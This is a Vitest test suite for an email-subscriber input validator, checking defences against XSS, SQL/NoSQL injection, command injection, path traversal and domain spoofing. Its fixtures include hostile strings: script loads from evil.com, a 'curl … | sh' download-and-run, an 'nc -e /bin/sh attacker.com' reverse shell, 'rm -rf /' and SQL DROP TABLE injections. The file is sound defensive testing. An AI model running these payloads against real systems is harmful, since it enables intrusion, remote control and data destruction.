import { describe, it, expect, beforeEach, vi } from 'vitest'
import { 
  isValidEmail, 
  sanitizeInput, 
  validateSubscriberData,
  isDomainAllowed,
  normalizeEmail
} from '../../utils/validation'
import { 
  // createPayloadRequestMock, 
  clearCollections 
} from '../mocks/payload'

describe('Input Validation Security', () => {
  // let _mockPayload: any
  
  beforeEach(() => {
    clearCollections()
    // const payloadMock = createPayloadRequestMock()
    // _mockPayload = payloadMock.payload
    vi.clearAllMocks()
  })

  describe('XSS Prevention', () => {
    it('should sanitize script tags in all variations', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<SCRIPT>alert("xss")</SCRIPT>',
        '<ScRiPt>alert("xss")</ScRiPt>',
        '<<script>alert("xss");//<</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script><!--alert("xss")//--></script>',
        '<script>alert(/xss/)</script>',
        '<script>alert`xss`</script>'
      ]
      
      xssAttempts.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('</script')
        expect(sanitized).not.toContain('alert')
      })
    })

    it('should remove event handlers', () => {
      const eventHandlers = [
        '<img src=x onerror=alert("xss")>',
        '<img src=x onError=alert("xss")>',
        '<img src=x ONERROR=alert("xss")>',
        '<svg onload=alert("xss")>',
        '<body onload=alert("xss")>',
        '<div onclick="alert(\'xss\')">Click</div>',
        '<a onmouseover="alert(\'xss\')">Hover</a>',
        '<input onfocus="alert(\'xss\')">',
        '<form onsubmit="alert(\'xss\')">',
        '<iframe onload="alert(\'xss\')">'
      ]
      
      eventHandlers.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toMatch(/on\w+\s*=/i)
        expect(sanitized).not.toContain('alert')
      })
    })

    it('should prevent javascript protocol injection', () => {
      const jsProtocols = [
        '<a href="javascript:alert(\'xss\')">Click</a>',
        '<a href="JAVASCRIPT:alert(\'xss\')">Click</a>',
        '<a href="javascript:void(0)">Click</a>',
        '<iframe src="javascript:alert(\'xss\')">',
        '<img src="javascript:alert(\'xss\')">',
        '<form action="javascript:alert(\'xss\')">'
      ]
      
      jsProtocols.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toMatch(/javascript:/i)
        expect(sanitized).not.toContain('alert')
      })
    })

    it('should handle data URIs safely', () => {
      const dataUris = [
        '<img src="data:text/html,<script>alert(\'xss\')</script>">',
        '<object data="data:text/html,<script>alert(\'xss\')</script>">',
        '<embed src="data:text/html,<script>alert(\'xss\')</script>">'
      ]
      
      dataUris.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('script')
        expect(sanitized).not.toContain('alert')
      })
    })

    it('should prevent style-based XSS', () => {
      const styleXss = [
        '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
        '<div style="background:url(\'javascript:alert(\\\'xss\\\')\')">',
        '<div style="expression(alert(\'xss\'))">',
        '<style>@import "http://evil.com/xss.css";</style>'
      ]
      
      styleXss.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('expression')
        expect(sanitized).not.toContain('@import')
      })
    })

    it('should handle encoded XSS attempts', () => {
      const encodedXss = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '&#60;script&#62;alert("xss")&#60;/script&#62;',
        '\\x3cscript\\x3ealert("xss")\\x3c/script\\x3e',
        '%3Cscript%3Ealert("xss")%3C/script%3E',
        '\\u003cscript\\u003ealert("xss")\\u003c/script\\u003e'
      ]
      
      encodedXss.forEach(input => {
        const sanitized = sanitizeInput(input)
        // After decoding, should still be safe
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('alert')
      })
    })
  })

  describe('SQL/NoSQL Injection Prevention', () => {
    it('should validate against SQL injection in email field', () => {
      const sqlInjections = [
        "admin'--",
        "admin' OR '1'='1",
        "admin'; DROP TABLE subscribers; --",
        "admin' UNION SELECT * FROM users--",
        "admin' OR 1=1--",
        "'; DELETE FROM subscribers WHERE ''='",
        "' OR EXISTS(SELECT * FROM users WHERE admin=true)--"
      ]
      
      sqlInjections.forEach(injection => {
        const result = validateSubscriberData({
          email: injection,
          name: 'Test'
        })
        
        expect(result.valid).toBe(false)
        expect(result.errors).toContain('Invalid email format')
      })
    })

    it('should prevent NoSQL injection attempts', () => {
      const noSqlInjections = [
        { email: { $gt: "" } },
        { email: { $ne: null } },
        { email: { $regex: ".*" } },
        { $where: "this.password == null" },
        { email: "user@example.com", $or: [{ admin: true }] }
      ]
      
      noSqlInjections.forEach(injection => {
        // Ensure object-based queries are rejected
        if (typeof injection.email !== 'string') {
          const result = validateSubscriberData(injection as any)
          expect(result.valid).toBe(false)
        }
      })
    })

    it('should sanitize query operators in string fields', () => {
      const queryOperators = [
        '$gt',
        '$gte',
        '$lt',
        '$lte',
        '$ne',
        '$in',
        '$nin',
        '$regex',
        '$where',
        '$or',
        '$and'
      ]
      
      queryOperators.forEach(op => {
        const sanitized = sanitizeInput(`user${op}@example.com`)
        // Should preserve the text but not as an operator
        expect(sanitized).toBe(`user${op}@example.com`)
      })
    })
  })

  describe('Command Injection Prevention', () => {
    it('should prevent shell command injection', () => {
      const commandInjections = [
        '; ls -la',
        '| whoami',
        '`cat /etc/passwd`',
        '$(rm -rf /)',
        '&& curl http://evil.com/steal.sh | sh',
        '\n/bin/bash',
        '; nc -e /bin/sh attacker.com 4444'
      ]
      
      commandInjections.forEach(injection => {
        const sanitized = sanitizeInput(injection)
        expect(sanitized).not.toContain('`')
        expect(sanitized).not.toContain('$(')
        expect(sanitized).not.toContain('&&')
        expect(sanitized).not.toContain('|')
      })
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attempts', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ]
      
      pathTraversals.forEach(path => {
        const sanitized = sanitizeInput(path)
        // Should not contain traversal patterns
        expect(sanitized).not.toMatch(/\.\.[/\\]/)
        expect(sanitized).not.toContain('file://')
      })
    })
  })

  describe('Email Validation Security', () => {
    it('should reject emails with XSS attempts', () => {
      const maliciousEmails = [
        '<script>alert("xss")</script>@example.com',
        'user@example.com<script>alert("xss")</script>',
        '"<script>alert("xss")</script>"@example.com',
        'user+<script>@example.com',
        'user@example.com?<script>alert("xss")</script>'
      ]
      
      maliciousEmails.forEach(email => {
        expect(isValidEmail(email)).toBe(false)
      })
    })

    it('should validate email length limits', () => {
      const longLocal = 'a'.repeat(65) + '@example.com' // Local part > 64 chars
      const longDomain = 'user@' + 'a'.repeat(256) + '.com' // Domain > 255 chars
      const validLong = 'a'.repeat(63) + '@' + 'b'.repeat(63) + '.com'
      
      expect(isValidEmail(longLocal)).toBe(false)
      expect(isValidEmail(longDomain)).toBe(false)
      expect(isValidEmail(validLong)).toBe(true)
    })

    it('should reject emails with invalid characters', () => {
      const invalidEmails = [
        'user name@example.com', // Space
        'user\0@example.com', // Null byte
        'user\n@example.com', // Newline
        'user\r@example.com', // Carriage return
        'user@exam ple.com', // Space in domain
        'user@[192.168.1.1]', // IP address (if not allowed)
      ]
      
      invalidEmails.forEach(email => {
        expect(isValidEmail(email)).toBe(false)
      })
    })

    it('should handle internationalized domain names safely', () => {
      const idnEmails = [
        'user@münchen.de',
        'user@example.xn--p1ai', // Punycode
        'user@日本.jp',
        'user@εχαμπλε.gr'
      ]
      
      idnEmails.forEach(email => {
        // Should handle IDN safely without throwing
        expect(() => isValidEmail(email)).not.toThrow()
      })
    })
  })

  describe('Domain Allow/Block Lists', () => {
    it('should enforce domain allowlist', () => {
      const allowedDomains = ['example.com', 'company.org']
      
      expect(isDomainAllowed('user@example.com', allowedDomains)).toBe(true)
      expect(isDomainAllowed('user@company.org', allowedDomains)).toBe(true)
      expect(isDomainAllowed('user@notallowed.com', allowedDomains)).toBe(false)
    })

    it('should handle subdomain matching correctly', () => {
      const allowedDomains = ['example.com']
      
      // Exact match only by default
      expect(isDomainAllowed('user@example.com', allowedDomains)).toBe(true)
      expect(isDomainAllowed('user@sub.example.com', allowedDomains)).toBe(false)
      expect(isDomainAllowed('user@example.com.evil.com', allowedDomains)).toBe(false)
    })

    it('should prevent domain spoofing', () => {
      const allowedDomains = ['safe.com']
      
      const spoofAttempts = [
        'user@safe.com.attacker.com',
        'user@safe.com@attacker.com',
        'user@safe.com%0d%0abcc:attacker@evil.com',
        'user@ѕafe.com', // Cyrillic 's'
        'user@xn--afe-9bb.com' // Punycode of above
      ]
      
      spoofAttempts.forEach(email => {
        expect(isDomainAllowed(email, allowedDomains)).toBe(false)
      })
    })
  })

  describe('Name Field Validation', () => {
    it('should sanitize names while preserving legitimate characters', () => {
      const testCases = [
        { input: 'John Doe', expected: 'John Doe' },
        { input: 'María José', expected: 'María José' },
        { input: '李明', expected: '李明' },
        { input: 'Jean-Pierre', expected: 'Jean-Pierre' },
        { input: "O'Brien", expected: "O'Brien" },
        { input: '<script>alert("xss")</script>John', expected: 'John' },
        { input: 'John<img src=x onerror=alert(1)>', expected: 'John' }
      ]
      
      testCases.forEach(({ input, expected }) => {
        expect(sanitizeInput(input)).toBe(expected)
      })
    })

    it('should enforce name length limits', () => {
      const result = validateSubscriberData({
        email: 'user@example.com',
        name: 'a'.repeat(101) // Over 100 char limit
      })
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Name is too long (max 100 characters)')
    })
  })

  describe('Metadata Validation', () => {
    it('should validate metadata structure', () => {
      const validMetadata = {
        source: 'website',
        campaign: 'summer-2024',
        referrer: 'https://example.com'
      }
      
      const result = validateSubscriberData({
        email: 'user@example.com',
        metadata: validMetadata
      })
      
      expect(result.valid).toBe(true)
    })

    it('should reject metadata with injection attempts', () => {
      const maliciousMetadata = {
        source: '<script>alert("xss")</script>',
        campaign: { $ne: null }, // NoSQL injection
        referrer: 'javascript:alert("xss")'
      }
      
      // Each field should be sanitized or rejected
      const sanitized = JSON.parse(JSON.stringify(maliciousMetadata))
      Object.keys(sanitized).forEach(key => {
        if (typeof sanitized[key] === 'string') {
          sanitized[key] = sanitizeInput(sanitized[key])
        }
      })
      
      expect(sanitized.source).not.toContain('script')
      expect(sanitized.referrer).not.toContain('javascript:')
    })
  })

  describe('Source Field Validation', () => {
    it('should only allow predefined source values', () => {
      const validSources = ['website', 'api', 'import', 'admin', 'signup-form', 'magic-link', 'preferences', 'external']
      const invalidSources = ['', 'unknown', 'hack', '<script>', '../../../etc']
      
      validSources.forEach(source => {
        const result = validateSubscriberData({
          email: 'user@example.com',
          source
        })
        expect(result.valid).toBe(true)
      })
      
      invalidSources.forEach(source => {
        const result = validateSubscriberData({
          email: 'user@example.com',
          source
        })
        expect(result.valid).toBe(false)
      })
    })
  })

  describe('Unicode and Encoding Security', () => {
    it('should handle unicode normalization attacks', () => {
      // Different unicode representations of the same visual character
      const unicodeVariants = [
        'ﬀ', // ff ligature
        '𝓈𝒸𝓇𝒾𝓅𝓉', // Mathematical script
        '＜script＞', // Fullwidth
        'ｓｃｒｉｐｔ' // Halfwidth
      ]
      
      unicodeVariants.forEach(variant => {
        const sanitized = sanitizeInput(variant)
        // Should be safe regardless of unicode tricks
        expect(sanitized).toBeDefined()
      })
    })

    it('should prevent null byte injection', () => {
      const nullByteInputs = [
        'user\0@example.com',
        'user@example.com\0.evil.com',
        'normal\0<script>alert("xss")</script>'
      ]
      
      nullByteInputs.forEach(input => {
        const sanitized = sanitizeInput(input)
        expect(sanitized).not.toContain('\0')
        expect(sanitized).not.toContain('\x00')
      })
    })
  })

  describe('Rate Limit Bypass Prevention via Input', () => {
    it('should normalize emails to prevent bypass', () => {
      // Test case 1: Case and alias variations
      const userVariants = [
        'user@example.com',
        'USER@EXAMPLE.COM',
        'user@EXAMPLE.com',
        'user+tag@example.com',
        'user+tag+another@example.com',
      ]
      
      const userNormalized = userVariants.map(email => normalizeEmail(email))
      const uniqueUserEmails = new Set(userNormalized)
      expect(uniqueUserEmails.size).toBe(1) // All normalize to user@example.com
      
      // Test case 2: Different users with dots
      const differentUsers = [
        'user@example.com',
        'user.name@example.com', // This is a different user
        'john.doe@example.com'
      ]
      
      const differentNormalized = differentUsers.map(email => normalizeEmail(email))
      const uniqueDifferent = new Set(differentNormalized)
      expect(uniqueDifferent.size).toBe(3) // These are legitimately different users
    })
  })
})